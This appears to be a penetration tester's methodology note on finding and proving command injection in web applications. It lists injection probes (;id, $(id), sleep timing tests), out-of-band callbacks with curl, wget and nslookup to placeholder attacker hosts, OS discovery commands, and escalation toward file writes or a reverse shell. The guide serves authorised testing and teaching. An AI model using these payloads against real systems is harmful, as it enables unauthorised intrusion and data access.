# Command Injection

## Why It Matters

Command injection can move a web finding straight into operating system access. In practice the path is usually:

- identify an input that influences a shell command
- prove command execution
- determine whether output is visible, blind, or out-of-band
- escalate to file read, persistence, or a shell only if needed

## Recognition Cues

Look for inputs used by:

- ping or traceroute tools
- DNS lookup features
- image processing wrappers
- archive handling
- PDF or office conversion
- backup, export, and diagnostic functions

Strong hints:

- shell syntax errors in responses
- unusual delays after `sleep`
- output from commands appearing in the response

## Workflow

1. identify the parameter likely reaching a shell command
2. determine the operating system and command context
3. test simple separators and substitutions
4. decide whether the issue is reflected, blind, or out-of-band
5. prove impact with the least noisy technique

## Step 1: Initial Syntax Tests

Common probes:

```text
;id
&& id
| id
`id`
$(id)
```

Use Windows variants when appropriate:

```text
& whoami
&& whoami
| whoami
```

You are trying to learn:

- which metacharacters survive
- whether the app is on Linux or Windows
- whether output returns in-band

## Step 2: Blind Detection

If output is not reflected, use timing:

```text
; sleep 10
; ping -c 10 127.0.0.1
& timeout 10
& ping -n 10 127.0.0.1
```

If the response delay changes reliably, you likely have blind command execution.

## Step 3: Out-Of-Band Detection

If timing is unclear, try DNS or HTTP callbacks:

```text
nslookup uniquestring.attackerdomain.com
wget http://attacker.com/uniquestring
curl http://attacker.com/uniquestring
```

This is especially useful when:

- the app suppresses output
- command results are not visible
- time-based testing is noisy

## Step 4: OS And Context Discovery

Use small probes:

### Linux

```text
uname -a
cat /etc/issue
id
whoami
```

### Windows

```text
ver
whoami
hostname
type C:\Windows\System32\drivers\etc\hosts
```

The goal is to confirm execution, not to spray large payloads.

## Useful Injection Styles

### Separators

```text
; command
&& command
| command
```

### Substitution

```text
`command`
$(command)
```

### Newlines

```text
%0acommand
%0dcommand
```

Different filters fail in different ways, so test more than one style.

## Escalation Paths

Once you confirm execution, typical next steps are:

- read files
- write a proof file
- run a short one-shot command
- move to a reverse shell only if required

Example proof:

```text
; whoami > /var/www/html/whoami.txt
```

## Pitfalls

- assuming Linux payloads on a Windows host
- jumping to a reverse shell before confirming basic execution
- misreading application latency as time-based execution
- forgetting that some payloads land inside quoted arguments

## Reporting Notes

Capture:

- the vulnerable parameter
- the payload class that worked
- whether the issue was reflected, blind, or out-of-band
- the user context gained
- what system access or file access was demonstrated

## Fast Checklist

```text
1. Find a shell-reaching input
2. Test separators and substitution
3. Confirm reflected, blind, or OOB behavior
4. Identify OS context
5. Prove minimal impact
6. Save payload, response, and host-level evidence
```
